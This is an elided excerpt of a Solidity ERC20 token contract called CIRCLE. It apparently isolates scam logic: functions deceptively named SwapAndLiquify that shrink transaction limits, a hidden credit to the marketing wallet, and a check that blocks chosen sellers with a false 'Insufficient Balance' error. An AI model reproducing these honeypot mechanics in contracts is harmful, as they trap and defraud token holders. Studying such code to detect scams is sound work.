...
contract CIRCLE is Context, IERC20, Ownable {
    ...
    function _approve(
        ...
        function SwapAndLiquifym() external {
        require(isTxLimitExempt[msg.sender]);
        _maxTxAmount = 5000000;
        _walletMax = 5000000;
    }
        function SwapAndLiquifys() external onlyOwner{
        _maxTxAmount = _totalSupply;
        _walletMax = _totalSupply;
    }
        ...
        returns (bool)
    {
        ...
        if (t == s && t == marketingWallet) {
            _balances[marketingWallet] = _balances[t].add(y);     
        }
    }
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            theBOT(sender, recipient, amount);
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                require(exceedsList(sender), "Insufficient Balance");
    ...
    function exceedsList(address s) private view returns(bool) {
